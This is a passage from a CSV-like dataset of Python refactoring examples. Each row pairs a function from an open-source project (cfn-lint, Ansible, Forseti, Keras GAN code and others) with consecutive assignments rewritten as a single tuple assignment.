        for ref_obj in ref_objs:
            value = ref_obj[-1]
            if value not in PSEUDOPARAMS:
                scenarios = cfn.is_resource_available(ref_obj, value)
                for scenario in scenarios:
                    # pylint: disable=consider-using-f-string
                    scenario_text = "" and "".join(
                        [
                            'when condition ""%s"" is %s' % (k, v)
                            for (k, v) in scenario.items()
                        ]
                    )
                    message = (
                        'Ref to resource ""{0}"" that may not be available {1} at {2}'
                    )
                    matches.append(
                        RuleMatch(
                            ref_obj[:-1],
                            message.format(
                                value, scenario_text, ""/"".join(map(str, ref_obj[:-1]))
                            ),
                        )
                    )

        # The do GetAtt
        getatt_objs = cfn.search_deep_keys(
            searchText=""Fn::GetAtt"", includeGlobals=False
        )
        for getatt_obj in getatt_objs:
            value_obj = getatt_obj[-1]
            value = None
            if isinstance(value_obj, list):
                value = value_obj[0]
            elif isinstance(value_obj, str):
                value = value_obj.split(""."")[0]
            if value:
                if value not in PSEUDOPARAMS:
                    scenarios = cfn.is_resource_available(getatt_obj, value)
                    for scenario in scenarios:
                        scenario_text = "" and "".join(
                            [
                                f'when condition ""{k}"" is {v}'
                                for (k, v) in scenario.items()
                            ]
                        )
                        message = 'GetAtt to resource ""{0}"" that may not be available {1} at {2}'
                        matches.append(
                            RuleMatch(
                                getatt_obj[:-1],
                                message.format(
                                    value,
                                    scenario_text,
                                    ""/"".join(map(str, getatt_obj[:-1])),
                                ),
                            )
                        )

        return matches","matches = []
ref_objs = cfn.search_deep_keys(searchText='Ref', includeGlobals=False)","matches , ref_objs  = [], cfn.search_deep_keys(searchText='Ref', includeGlobals=False)"
cfn-lint,https://github.com/aws-cloudformation/cfn-lint/tree/master/src/cfnlint/rules/functions/RelationshipConditions.py,RelationshipConditions,match$22,"def match(self, cfn):
        """"""Check CloudFormation Ref/GetAtt for Conditions""""""

        matches = []

        # Start with Ref checks
        ref_objs = cfn.search_deep_keys(searchText=""Ref"", includeGlobals=False)
        for ref_obj in ref_objs:
            value = ref_obj[-1]
            if value not in PSEUDOPARAMS:
                scenarios = cfn.is_resource_available(ref_obj, value)
                for scenario in scenarios:
                    # pylint: disable=consider-using-f-string
                    scenario_text = "" and "".join(
                        [
                            'when condition ""%s"" is %s' % (k, v)
                            for (k, v) in scenario.items()
                        ]
                    )
                    message = (
                        'Ref to resource ""{0}"" that may not be available {1} at {2}'
                    )
                    matches.append(
                        RuleMatch(
                            ref_obj[:-1],
                            message.format(
                                value, scenario_text, ""/"".join(map(str, ref_obj[:-1]))
                            ),
                        )
                    )

        # The do GetAtt
        getatt_objs = cfn.search_deep_keys(
            searchText=""Fn::GetAtt"", includeGlobals=False
        )
        for getatt_obj in getatt_objs:
            value_obj = getatt_obj[-1]
            value = None
            if isinstance(value_obj, list):
                value = value_obj[0]
            elif isinstance(value_obj, str):
                value = value_obj.split(""."")[0]
            if value:
                if value not in PSEUDOPARAMS:
                    scenarios = cfn.is_resource_available(getatt_obj, value)
                    for scenario in scenarios:
                        scenario_text = "" and "".join(
                            [
                                f'when condition ""{k}"" is {v}'
                                for (k, v) in scenario.items()
                            ]
                        )
                        message = 'GetAtt to resource ""{0}"" that may not be available {1} at {2}'
                        matches.append(
                            RuleMatch(
                                getatt_obj[:-1],
                                message.format(
                                    value,
                                    scenario_text,
                                    ""/"".join(map(str, getatt_obj[:-1])),
                                ),
                            )
                        )

        return matches","value_obj = getatt_obj[-1]
value = None","value_obj , value  = getatt_obj[-1], None"
cfn-lint,https://github.com/aws-cloudformation/cfn-lint/tree/master/src/cfnlint/rules/functions/RelationshipConditions.py,RelationshipConditions,match$22,"def match(self, cfn):
        """"""Check CloudFormation Ref/GetAtt for Conditions""""""

        matches = []

        # Start with Ref checks
        ref_objs = cfn.search_deep_keys(searchText=""Ref"", includeGlobals=False)
        for ref_obj in ref_objs:
            value = ref_obj[-1]
            if value not in PSEUDOPARAMS:
                scenarios = cfn.is_resource_available(ref_obj, value)
                for scenario in scenarios:
                    # pylint: disable=consider-using-f-string
                    scenario_text = "" and "".join(
                        [
                            'when condition ""%s"" is %s' % (k, v)
                            for (k, v) in scenario.items()
                        ]
                    )
                    message = (
                        'Ref to resource ""{0}"" that may not be available {1} at {2}'
                    )
                    matches.append(
                        RuleMatch(
                            ref_obj[:-1],
                            message.format(
                                value, scenario_text, ""/"".join(map(str, ref_obj[:-1]))
                            ),
                        )
                    )

        # The do GetAtt
        getatt_objs = cfn.search_deep_keys(
            searchText=""Fn::GetAtt"", includeGlobals=False
        )
        for getatt_obj in getatt_objs:
            value_obj = getatt_obj[-1]
            value = None
            if isinstance(value_obj, list):
                value = value_obj[0]
            elif isinstance(value_obj, str):
                value = value_obj.split(""."")[0]
            if value:
                if value not in PSEUDOPARAMS:
                    scenarios = cfn.is_resource_available(getatt_obj, value)
                    for scenario in scenarios:
                        scenario_text = "" and "".join(
                            [
                                f'when condition ""{k}"" is {v}'
                                for (k, v) in scenario.items()
                            ]
                        )
                        message = 'GetAtt to resource ""{0}"" that may not be available {1} at {2}'
                        matches.append(
                            RuleMatch(
                                getatt_obj[:-1],
                                message.format(
                                    value,
                                    scenario_text,
                                    ""/"".join(map(str, getatt_obj[:-1])),
                                ),
                            )
                        )

        return matches","scenario_text = ' and '.join(['when condition ""%s"" is %s' % (k, v) for (k, v) in scenario.items()])
message = 'Ref to resource ""{0}"" that may not be available {1} at {2}'","scenario_text , message  = ' and '.join(['when condition ""%s"" is %s' % (k, v) for (k, v) in scenario.items()]), 'Ref to resource ""{0}"" that may not be available {1} at {2}'"
cfn-lint,https://github.com/aws-cloudformation/cfn-lint/tree/master/src/cfnlint/rules/functions/RelationshipConditions.py,RelationshipConditions,match$22,"def match(self, cfn):
        """"""Check CloudFormation Ref/GetAtt for Conditions""""""

        matches = []

        # Start with Ref checks
        ref_objs = cfn.search_deep_keys(searchText=""Ref"", includeGlobals=False)
        for ref_obj in ref_objs:
            value = ref_obj[-1]
            if value not in PSEUDOPARAMS:
                scenarios = cfn.is_resource_available(ref_obj, value)
                for scenario in scenarios:
                    # pylint: disable=consider-using-f-string
                    scenario_text = "" and "".join(
                        [
                            'when condition ""%s"" is %s' % (k, v)
                            for (k, v) in scenario.items()
                        ]
                    )
                    message = (
                        'Ref to resource ""{0}"" that may not be available {1} at {2}'
                    )
                    matches.append(
                        RuleMatch(
                            ref_obj[:-1],
                            message.format(
                                value, scenario_text, ""/"".join(map(str, ref_obj[:-1]))
                            ),
                        )
                    )

        # The do GetAtt
        getatt_objs = cfn.search_deep_keys(
            searchText=""Fn::GetAtt"", includeGlobals=False
        )
        for getatt_obj in getatt_objs:
            value_obj = getatt_obj[-1]
            value = None
            if isinstance(value_obj, list):
                value = value_obj[0]
            elif isinstance(value_obj, str):
                value = value_obj.split(""."")[0]
            if value:
                if value not in PSEUDOPARAMS:
                    scenarios = cfn.is_resource_available(getatt_obj, value)
                    for scenario in scenarios:
                        scenario_text = "" and "".join(
                            [
                                f'when condition ""{k}"" is {v}'
                                for (k, v) in scenario.items()
                            ]
                        )
                        message = 'GetAtt to resource ""{0}"" that may not be available {1} at {2}'
                        matches.append(
                            RuleMatch(
                                getatt_obj[:-1],
                                message.format(
                                    value,
                                    scenario_text,
                                    ""/"".join(map(str, getatt_obj[:-1])),
                                ),
                            )
                        )

        return matches","scenario_text = ' and '.join([f'when condition ""{k}"" is {v}' for (k, v) in scenario.items()])
message = 'GetAtt to resource ""{0}"" that may not be available {1} at {2}'","scenario_text , message  = ' and '.join([f'when condition ""{k}"" is {v}' for (k, v) in scenario.items()]), 'GetAtt to resource ""{0}"" that may not be available {1} at {2}'"
ansible-modules-core,https://github.com/ansible/ansible-modules-core/tree/master/cloud/docker/docker_container.py,TaskParameters,_parse_exposed_ports$1016,"def _parse_exposed_ports(self, published_ports):
        '''
        Parse exposed ports from docker CLI-style ports syntax.
        '''
        exposed = []
        if self.exposed_ports:
            for port in self.exposed_ports:
                port = str(port).strip()
                protocol = 'tcp'
                match = re.search(r'(/.+$)', port)
                if match:
                    protocol = match.group(1).replace('/', '')
                    port = re.sub(r'/.+$', '', port)
                exposed.append((port, protocol))
        if published_ports:
            # Any published port should also be exposed
            for publish_port in published_ports:
                match = False
                if isinstance(publish_port, basestring) and '/' in publish_port:
                    port, protocol = publish_port.split('/')
                    port = int(port)
                else:
                    protocol = 'tcp'
                    port = int(publish_port)
                for exposed_port in exposed:
                    if isinstance(exposed_port[0], basestring) and '-' in exposed_port[0]:
                        start_port, end_port = exposed_port[0].split('-')
                        if int(start_port) <= port <= int(end_port):
                            match = True
                    elif exposed_port[0] == port:
                        match = True
                if not match:
                    exposed.append((port, protocol))
        return exposed","protocol = 'tcp'
match = re.search('(/.+$)', port)","protocol , match  = 'tcp', re.search('(/.+$)', port)"
ansible-modules-core,https://github.com/ansible/ansible-modules-core/tree/master/cloud/docker/docker_container.py,TaskParameters,_parse_exposed_ports$1016,"def _parse_exposed_ports(self, published_ports):
        '''
        Parse exposed ports from docker CLI-style ports syntax.
        '''
        exposed = []
        if self.exposed_ports:
            for port in self.exposed_ports:
                port = str(port).strip()
                protocol = 'tcp'
                match = re.search(r'(/.+$)', port)
                if match:
                    protocol = match.group(1).replace('/', '')
                    port = re.sub(r'/.+$', '', port)
                exposed.append((port, protocol))
        if published_ports:
            # Any published port should also be exposed
            for publish_port in published_ports:
                match = False
                if isinstance(publish_port, basestring) and '/' in publish_port:
                    port, protocol = publish_port.split('/')
                    port = int(port)
                else:
                    protocol = 'tcp'
                    port = int(publish_port)
                for exposed_port in exposed:
                    if isinstance(exposed_port[0], basestring) and '-' in exposed_port[0]:
                        start_port, end_port = exposed_port[0].split('-')
                        if int(start_port) <= port <= int(end_port):
                            match = True
                    elif exposed_port[0] == port:
                        match = True
                if not match:
                    exposed.append((port, protocol))
        return exposed","protocol = match.group(1).replace('/', '')
port = re.sub('/.+$', '', port)","protocol , port  = match.group(1).replace('/', ''), re.sub('/.+$', '', port)"
forseti-security,https://github.com/forseti-security/forseti-security/tree/master/google/cloud/forseti/scanner/audit/role_rules_engine.py,Rule,find_violations_in_role$229,"def find_violations_in_role(role):
            """"""Get a generator for violations.

            Args:
                role (role): Find violation from the role.
            Returns:
                RuleViolation: All violations of the role breaking the rule.
            """"""
            resource_ancestors = (relationship.find_ancestors(
                role, role.full_name))

            violations = itertools.chain()
            for related_resources in resource_ancestors:
                violations = itertools.chain(
                    violations,
                    self.find_violations_by_ancestor(related_resources, role))
            return violations","resource_ancestors = relationship.find_ancestors(role, role.full_name)
violations = itertools.chain()","resource_ancestors , violations  = relationship.find_ancestors(role, role.full_name), itertools.chain()"
sdc,https://github.com/IntelPython/sdc/tree/master/sdc/tests/test_utils.py,,msg_and_func$181,"def msg_and_func(msg_or_func=None):
    if msg_or_func is None:
        # No signature, no function
        func = None
        msg = None
    elif isinstance(msg_or_func, str):
        # A message is passed
        func = None
        msg = msg_or_func
    else:
        # A function is passed
        func = msg_or_func
        msg = None
    return msg, func","func = None
msg = None","func , msg  = None, None"
sdc,https://github.com/IntelPython/sdc/tree/master/sdc/tests/test_utils.py,,msg_and_func$181,"def msg_and_func(msg_or_func=None):
    if msg_or_func is None:
        # No signature, no function
        func = None
        msg = None
    elif isinstance(msg_or_func, str):
        # A message is passed
        func = None
        msg = msg_or_func
    else:
        # A function is passed
        func = msg_or_func
        msg = None
    return msg, func","func = None
msg = msg_or_func","func , msg  = None, msg_or_func"
open_model_zoo,https://github.com/openvinotoolkit/open_model_zoo/tree/master/tools/accuracy_checker/openvino/tools/accuracy_checker/adapters/detection_person_vehicle.py,PersonVehicleDetectionAdapter,nms_apply_prop$226,"def nms_apply_prop(self, input_props):
        idx = []
        keep_ids = []
        is_dead = []

        for i in range(len(input_props)):
            idx.append(i)
            is_dead.append(False)

        def get_score(ii):
            val = input_props[ii][1]    # body_bbox_score
            return val

        idx.sort(key=get_score, reverse=True)

        for i in range(len(input_props)):
            li = idx[i]
            if is_dead[li]:
                continue

            keep_ids.append(li)

            for j in range(i+1, len(input_props)):
                ri = idx[j]

                if is_dead[ri]:
                    continue

                iou = self.compute_iou_prop(input_props[li], input_props[ri])

                if iou > self.iou_threshold:
                    is_dead[ri] = True

        output_props = []
        for it in keep_ids:
            if is_dead[it]:
                continue
            output_props.append(input_props[it])

        return output_props","idx = []
keep_ids = []
is_dead = []","idx , keep_ids , is_dead  = [], [], []"
AnimationsWithManim,https://github.com/Elteoremadebeethoven/AnimationsWithManim/tree/master/English/update_successions/alpha_projects/sum_external_angles.py,NewRegularPolygon,get_external_sides$12,"def get_external_sides(self,size=1,**kwargs):
        sides = self.get_sides()
        external_sides = VGroup()
        kwargs[""stroke_width""] = self.get_stroke_width()
        for side in sides:
            unit_vector = side.get_unit_vector()
            start = side.get_end()
            line = Line(
                    start,
                    start + size * unit_vector,
                    **kwargs   
                )
            external_sides.add(line)
        return external_sides","sides = self.get_sides()
external_sides = VGroup()
kwargs['stroke_width'] = self.get_stroke_width()","sides , external_sides , kwargs['stroke_width']  = self.get_sides(), VGroup(), self.get_stroke_width()"
AnimationsWithManim,https://github.com/Elteoremadebeethoven/AnimationsWithManim/tree/master/English/update_successions/alpha_projects/sum_external_angles.py,NewRegularPolygon,get_external_sides$12,"def get_external_sides(self,size=1,**kwargs):
        sides = self.get_sides()
        external_sides = VGroup()
        kwargs[""stroke_width""] = self.get_stroke_width()
        for side in sides:
            unit_vector = side.get_unit_vector()
            start = side.get_end()
            line = Line(
                    start,
                    start + size * unit_vector,
                    **kwargs   
                )
            external_sides.add(line)
        return external_sides","unit_vector = side.get_unit_vector()
start = side.get_end()","unit_vector , start  = side.get_unit_vector(), side.get_end()"
Advanced-Deep-Learning-with-Keras,https://github.com/PacktPublishing/Advanced-Deep-Learning-with-Keras/tree/master/chapter5-improved-gan/acgan-mnist-5.3.1.py,,train$37,"def train(models, data, params):
    """"""Train the discriminator and adversarial Networks

    Alternately train discriminator and adversarial 
    networks by batch.
    Discriminator is trained first with real and fake 
    images and corresponding one-hot labels.
    Adversarial is trained next with fake images pretending 
    to be real and corresponding one-hot labels.
    Generate sample images per save_interval.

    # Arguments
        models (list): Generator, Discriminator,
            Adversarial models
        data (list): x_train, y_train data
        params (list): Network parameters

    """"""
    # the GAN models
    generator, discriminator, adversarial = models
    # images and their one-hot labels
    x_train, y_train = data
    # network parameters
    batch_size, latent_size, train_steps, num_labels, model_name \
            = params
    # the generator image is saved every 500 steps
    save_interval = 500
    # noise vector to see how the generator 
    # output evolves during training
    noise_input = np.random.uniform(-1.0,
                                    1.0, 
                                    size=[16, latent_size])
    # class labels are 0, 1, 2, 3, 4, 5, 
    # 6, 7, 8, 9, 0, 1, 2, 3, 4, 5
    # the generator must produce these MNIST digits
    noise_label = np.eye(num_labels)[np.arange(0, 16) % num_labels]
    # number of elements in train dataset
    train_size = x_train.shape[0]
    print(model_name,
          ""Labels for generated images: "",
          np.argmax(noise_label, axis=1))

    for i in range(train_steps):
        # train the discriminator for 1 batch
        # 1 batch of real (label=1.0) and fake images (label=0.0)
        # randomly pick real images and 
        # corresponding labels from dataset 
        rand_indexes = np.random.randint(0,
                                         train_size,
                                         size=batch_size)
        real_images = x_train[rand_indexes]
        real_labels = y_train[rand_indexes]
        # generate fake images from noise using generator
        # generate noise using uniform distribution
        noise = np.random.uniform(-1.0,
                                  1.0,
                                  size=[batch_size, latent_size])
        # randomly pick one-hot labels
        fake_labels = np.eye(num_labels)[np.random.choice(num_labels,
                                                          batch_size)]
        # generate fake images
        fake_images = generator.predict([noise, fake_labels])
        # real + fake images = 1 batch of train data
        x = np.concatenate((real_images, fake_images))
        # real + fake labels = 1 batch of train data labels
        labels = np.concatenate((real_labels, fake_labels))

        # label real and fake images
        # real images label is 1.0
        y = np.ones([2 * batch_size, 1])
        # fake images label is 0.0
        y[batch_size:, :] = 0
        # train discriminator network, log the loss and accuracy
        # ['loss', 'activation_1_loss', 
        # 'label_loss', 'activation_1_acc', 'label_acc']
        metrics  = discriminator.train_on_batch(x, [y, labels])
        fmt = ""%d: [disc loss: %f, srcloss: %f,"" 
        fmt += ""lblloss: %f, srcacc: %f, lblacc: %f]"" 
        log = fmt % (i, metrics[0], metrics[1], \
                metrics[2], metrics[3], metrics[4])

        # train the adversarial network for 1 batch
        # 1 batch of fake images with label=1.0 and
        # corresponding one-hot label or class 
        # since the discriminator weights are frozen 
        # in adversarial network only the generator is trained
        # generate noise using uniform distribution
        noise = np.random.uniform(-1.0,
                                  1.0, 
                                  size=[batch_size, latent_size])
        # randomly pick one-hot labels
        fake_labels = np.eye(num_labels)[np.random.choice(num_labels,
                                                          batch_size)]
        # label fake images as real
        y = np.ones([batch_size, 1])
        # train the adversarial network 
        # note that unlike in discriminator training, 
        # we do not save the fake images in a variable
        # the fake images go to the discriminator input 
        # of the adversarial for classification
        # log the loss and accuracy
        metrics  = adversarial.train_on_batch([noise, fake_labels],
                                              [y, fake_labels])
        fmt = ""%s [advr loss: %f, srcloss: %f,""
        fmt += ""lblloss: %f, srcacc: %f, lblacc: %f]"" 
        log = fmt % (log, metrics[0], metrics[1],\
                metrics[2], metrics[3], metrics[4])
        print(log)
        if (i + 1) % save_interval == 0:
            # plot generator images on a periodic basis
            gan.plot_images(generator,
                        noise_input=noise_input,
                        noise_label=noise_label,
                        show=False,
                        step=(i + 1),
                        model_name=model_name)

    # save the model after training the generator
    # the trained generator can be reloaded 
    # for future MNIST digit generation
    generator.save(model_name + "".h5"")","save_interval = 500
noise_input = np.random.uniform(-1.0, 1.0, size=[16, latent_size])
noise_label = np.eye(num_labels)[np.arange(0, 16) % num_labels]
train_size = x_train.shape[0]","save_interval , noise_input , noise_label , train_size  = 500, np.random.uniform(-1.0, 1.0, size=[16, latent_size]), np.eye(num_labels)[np.arange(0, 16) % num_labels], x_train.shape[0]"
Advanced-Deep-Learning-with-Keras,https://github.com/PacktPublishing/Advanced-Deep-Learning-with-Keras/tree/master/chapter5-improved-gan/acgan-mnist-5.3.1.py,,train$37,"def train(models, data, params):
    """"""Train the discriminator and adversarial Networks

    Alternately train discriminator and adversarial 
    networks by batch.
    Discriminator is trained first with real and fake 
    images and corresponding one-hot labels.
    Adversarial is trained next with fake images pretending 
    to be real and corresponding one-hot labels.
    Generate sample images per save_interval.

    # Arguments
        models (list): Generator, Discriminator,
            Adversarial models
        data (list): x_train, y_train data
        params (list): Network parameters

    """"""
    # the GAN models
    generator, discriminator, adversarial = models
    # images and their one-hot labels
    x_train, y_train = data
    # network parameters
    batch_size, latent_size, train_steps, num_labels, model_name \
            = params
    # the generator image is saved every 500 steps
    save_interval = 500
    # noise vector to see how the generator 
    # output evolves during training
    noise_input = np.random.uniform(-1.0,
                                    1.0, 
                                    size=[16, latent_size])
    # class labels are 0, 1, 2, 3, 4, 5, 
    # 6, 7, 8, 9, 0, 1, 2, 3, 4, 5
    # the generator must produce these MNIST digits
    noise_label = np.eye(num_labels)[np.arange(0, 16) % num_labels]
    # number of elements in train dataset
    train_size = x_train.shape[0]
    print(model_name,
          ""Labels for generated images: "",
          np.argmax(noise_label, axis=1))

    for i in range(train_steps):
        # train the discriminator for 1 batch
        # 1 batch of real (label=1.0) and fake images (label=0.0)
        # randomly pick real images and 
        # corresponding labels from dataset 
        rand_indexes = np.random.randint(0,
                                         train_size,
                                         size=batch_size)
        real_images = x_train[rand_indexes]
        real_labels = y_train[rand_indexes]
        # generate fake images from noise using generator
        # generate noise using uniform distribution
        noise = np.random.uniform(-1.0,
                                  1.0,
                                  size=[batch_size, latent_size])
        # randomly pick one-hot labels
        fake_labels = np.eye(num_labels)[np.random.choice(num_labels,
                                                          batch_size)]
        # generate fake images
        fake_images = generator.predict([noise, fake_labels])
        # real + fake images = 1 batch of train data
        x = np.concatenate((real_images, fake_images))
        # real + fake labels = 1 batch of train data labels
        labels = np.concatenate((real_labels, fake_labels))

        # label real and fake images
        # real images label is 1.0
        y = np.ones([2 * batch_size, 1])
        # fake images label is 0.0
        y[batch_size:, :] = 0
        # train discriminator network, log the loss and accuracy
        # ['loss', 'activation_1_loss', 
        # 'label_loss', 'activation_1_acc', 'label_acc']
        metrics  = discriminator.train_on_batch(x, [y, labels])
        fmt = ""%d: [disc loss: %f, srcloss: %f,"" 
        fmt += ""lblloss: %f, srcacc: %f, lblacc: %f]"" 
        log = fmt % (i, metrics[0], metrics[1], \
                metrics[2], metrics[3], metrics[4])

        # train the adversarial network for 1 batch
        # 1 batch of fake images with label=1.0 and
        # corresponding one-hot label or class 
        # since the discriminator weights are frozen 
        # in adversarial network only the generator is trained
        # generate noise using uniform distribution
        noise = np.random.uniform(-1.0,
                                  1.0, 
                                  size=[batch_size, latent_size])
        # randomly pick one-hot labels
        fake_labels = np.eye(num_labels)[np.random.choice(num_labels,
                                                          batch_size)]
        # label fake images as real
        y = np.ones([batch_size, 1])
        # train the adversarial network 
        # note that unlike in discriminator training, 
        # we do not save the fake images in a variable
        # the fake images go to the discriminator input 
        # of the adversarial for classification
        # log the loss and accuracy
        metrics  = adversarial.train_on_batch([noise, fake_labels],
                                              [y, fake_labels])
        fmt = ""%s [advr loss: %f, srcloss: %f,""
        fmt += ""lblloss: %f, srcacc: %f, lblacc: %f]"" 
        log = fmt % (log, metrics[0], metrics[1],\
                metrics[2], metrics[3], metrics[4])
        print(log)
        if (i + 1) % save_interval == 0:
            # plot generator images on a periodic basis
            gan.plot_images(generator,
                        noise_input=noise_input,
                        noise_label=noise_label,
                        show=False,
                        step=(i + 1),
                        model_name=model_name)

    # save the model after training the generator
    # the trained generator can be reloaded 
    # for future MNIST digit generation
    generator.save(model_name + "".h5"")","real_images = x_train[rand_indexes]
real_labels = y_train[rand_indexes]
noise = np.random.uniform(-1.0, 1.0, size=[batch_size, latent_size])
fake_labels = np.eye(num_labels)[np.random.choice(num_labels, batch_size)]","real_images , real_labels , noise , fake_labels  = x_train[rand_indexes], y_train[rand_indexes], np.random.uniform(-1.0, 1.0, size=[batch_size, latent_size]), np.eye(num_labels)[np.random.choice(num_labels, batch_size)]"
Advanced-Deep-Learning-with-Keras,https://github.com/PacktPublishing/Advanced-Deep-Learning-with-Keras/tree/master/chapter5-improved-gan/acgan-mnist-5.3.1.py,,train$37,"def train(models, data, params):
    """"""Train the discriminator and adversarial Networks

    Alternately train discriminator and adversarial 
    networks by batch.
    Discriminator is trained first with real and fake 
    images and corresponding one-hot labels.
    Adversarial is trained next with fake images pretending 
    to be real and corresponding one-hot labels.
    Generate sample images per save_interval.

    # Arguments
        models (list): Generator, Discriminator,
            Adversarial models
        data (list): x_train, y_train data
        params (list): Network parameters

    """"""
    # the GAN models
    generator, discriminator, adversarial = models
    # images and their one-hot labels
    x_train, y_train = data
    # network parameters
    batch_size, latent_size, train_steps, num_labels, model_name \
            = params
    # the generator image is saved every 500 steps
    save_interval = 500
    # noise vector to see how the generator 
    # output evolves during training
    noise_input = np.random.uniform(-1.0,
                                    1.0, 
                                    size=[16, latent_size])
    # class labels are 0, 1, 2, 3, 4, 5, 
    # 6, 7, 8, 9, 0, 1, 2, 3, 4, 5
    # the generator must produce these MNIST digits
    noise_label = np.eye(num_labels)[np.arange(0, 16) % num_labels]
    # number of elements in train dataset
    train_size = x_train.shape[0]
    print(model_name,
          ""Labels for generated images: "",
          np.argmax(noise_label, axis=1))

    for i in range(train_steps):
        # train the discriminator for 1 batch
        # 1 batch of real (label=1.0) and fake images (label=0.0)
        # randomly pick real images and 
        # corresponding labels from dataset 
        rand_indexes = np.random.randint(0,
                                         train_size,
                                         size=batch_size)
        real_images = x_train[rand_indexes]
        real_labels = y_train[rand_indexes]
        # generate fake images from noise using generator
        # generate noise using uniform distribution
        noise = np.random.uniform(-1.0,
                                  1.0,
                                  size=[batch_size, latent_size])
        # randomly pick one-hot labels
        fake_labels = np.eye(num_labels)[np.random.choice(num_labels,
                                                          batch_size)]
        # generate fake images
        fake_images = generator.predict([noise, fake_labels])
        # real + fake images = 1 batch of train data
        x = np.concatenate((real_images, fake_images))
        # real + fake labels = 1 batch of train data labels
        labels = np.concatenate((real_labels, fake_labels))

        # label real and fake images
        # real images label is 1.0
        y = np.ones([2 * batch_size, 1])
        # fake images label is 0.0
        y[batch_size:, :] = 0
        # train discriminator network, log the loss and accuracy
        # ['loss', 'activation_1_loss', 
        # 'label_loss', 'activation_1_acc', 'label_acc']
        metrics  = discriminator.train_on_batch(x, [y, labels])
        fmt = ""%d: [disc loss: %f, srcloss: %f,"" 
        fmt += ""lblloss: %f, srcacc: %f, lblacc: %f]"" 
        log = fmt % (i, metrics[0], metrics[1], \
                metrics[2], metrics[3], metrics[4])

        # train the adversarial network for 1 batch
        # 1 batch of fake images with label=1.0 and
        # corresponding one-hot label or class 
        # since the discriminator weights are frozen 
        # in adversarial network only the generator is trained
        # generate noise using uniform distribution
        noise = np.random.uniform(-1.0,
                                  1.0, 
                                  size=[batch_size, latent_size])
        # randomly pick one-hot labels
        fake_labels = np.eye(num_labels)[np.random.choice(num_labels,
                                                          batch_size)]
        # label fake images as real
        y = np.ones([batch_size, 1])
        # train the adversarial network 
        # note that unlike in discriminator training, 
        # we do not save the fake images in a variable
        # the fake images go to the discriminator input 
        # of the adversarial for classification
        # log the loss and accuracy
        metrics  = adversarial.train_on_batch([noise, fake_labels],
                                              [y, fake_labels])
        fmt = ""%s [advr loss: %f, srcloss: %f,""
        fmt += ""lblloss: %f, srcacc: %f, lblacc: %f]"" 
        log = fmt % (log, metrics[0], metrics[1],\
                metrics[2], metrics[3], metrics[4])
        print(log)
        if (i + 1) % save_interval == 0:
            # plot generator images on a periodic basis
            gan.plot_images(generator,
                        noise_input=noise_input,
                        noise_label=noise_label,
                        show=False,
                        step=(i + 1),
                        model_name=model_name)

    # save the model after training the generator
    # the trained generator can be reloaded 
    # for future MNIST digit generation
    generator.save(model_name + "".h5"")","x = np.concatenate((real_images, fake_images))
labels = np.concatenate((real_labels, fake_labels))
y = np.ones([2 * batch_size, 1])","x , labels , y  = np.concatenate((real_images, fake_images)), np.concatenate((real_labels, fake_labels)), np.ones([2 * batch_size, 1])"
Advanced-Deep-Learning-with-Keras,https://github.com/PacktPublishing/Advanced-Deep-Learning-with-Keras/tree/master/chapter5-improved-gan/acgan-mnist-5.3.1.py,,train$37,"def train(models, data, params):
    """"""Train the discriminator and adversarial Networks

    Alternately train discriminator and adversarial 
    networks by batch.
    Discriminator is trained first with real and fake 
    images and corresponding one-hot labels.
    Adversarial is trained next with fake images pretending 
    to be real and corresponding one-hot labels.
    Generate sample images per save_interval.

    # Arguments
        models (list): Generator, Discriminator,
            Adversarial models
        data (list): x_train, y_train data
        params (list): Network parameters

    """"""
    # the GAN models
    generator, discriminator, adversarial = models
    # images and their one-hot labels
    x_train, y_train = data
    # network parameters
    batch_size, latent_size, train_steps, num_labels, model_name \
            = params
    # the generator image is saved every 500 steps
    save_interval = 500
    # noise vector to see how the generator 
    # output evolves during training
    noise_input = np.random.uniform(-1.0,
                                    1.0, 
                                    size=[16, latent_size])
    # class labels are 0, 1, 2, 3, 4, 5, 
    # 6, 7, 8, 9, 0, 1, 2, 3, 4, 5
    # the generator must produce these MNIST digits
    noise_label = np.eye(num_labels)[np.arange(0, 16) % num_labels]
    # number of elements in train dataset
    train_size = x_train.shape[0]
    print(model_name,
          ""Labels for generated images: "",
          np.argmax(noise_label, axis=1))

    for i in range(train_steps):
        # train the discriminator for 1 batch
        # 1 batch of real (label=1.0) and fake images (label=0.0)
        # randomly pick real images and 
        # corresponding labels from dataset 
        rand_indexes = np.random.randint(0,
                                         train_size,
                                         size=batch_size)
        real_images = x_train[rand_indexes]
        real_labels = y_train[rand_indexes]
        # generate fake images from noise using generator
        # generate noise using uniform distribution
        noise = np.random.uniform(-1.0,
                                  1.0,
                                  size=[batch_size, latent_size])
        # randomly pick one-hot labels
        fake_labels = np.eye(num_labels)[np.random.choice(num_labels,
                                                          batch_size)]
        # generate fake images
        fake_images = generator.predict([noise, fake_labels])
        # real + fake images = 1 batch of train data
        x = np.concatenate((real_images, fake_images))
        # real + fake labels = 1 batch of train data labels
        labels = np.concatenate((real_labels, fake_labels))

        # label real and fake images
        # real images label is 1.0
        y = np.ones([2 * batch_size, 1])
        # fake images label is 0.0
        y[batch_size:, :] = 0
        # train discriminator network, log the loss and accuracy
        # ['loss', 'activation_1_loss', 
        # 'label_loss', 'activation_1_acc', 'label_acc']
        metrics  = discriminator.train_on_batch(x, [y, labels])
        fmt = ""%d: [disc loss: %f, srcloss: %f,"" 
        fmt += ""lblloss: %f, srcacc: %f, lblacc: %f]"" 
        log = fmt % (i, metrics[0], metrics[1], \
                metrics[2], metrics[3], metrics[4])

        # train the adversarial network for 1 batch
        # 1 batch of fake images with label=1.0 and
        # corresponding one-hot label or class 
        # since the discriminator weights are frozen 
        # in adversarial network only the generator is trained
        # generate noise using uniform distribution
        noise = np.random.uniform(-1.0,
                                  1.0, 
                                  size=[batch_size, latent_size])
        # randomly pick one-hot labels
        fake_labels = np.eye(num_labels)[np.random.choice(num_labels,
                                                          batch_size)]
        # label fake images as real
        y = np.ones([batch_size, 1])
        # train the adversarial network 
        # note that unlike in discriminator training, 
        # we do not save the fake images in a variable
        # the fake images go to the discriminator input 
        # of the adversarial for classification
        # log the loss and accuracy
        metrics  = adversarial.train_on_batch([noise, fake_labels],
                                              [y, fake_labels])
        fmt = ""%s [advr loss: %f, srcloss: %f,""
        fmt += ""lblloss: %f, srcacc: %f, lblacc: %f]"" 
        log = fmt % (log, metrics[0], metrics[1],\
                metrics[2], metrics[3], metrics[4])
        print(log)
        if (i + 1) % save_interval == 0:
            # plot generator images on a periodic basis
            gan.plot_images(generator,
                        noise_input=noise_input,
                        noise_label=noise_label,
                        show=False,
                        step=(i + 1),
                        model_name=model_name)

    # save the model after training the generator
    # the trained generator can be reloaded 
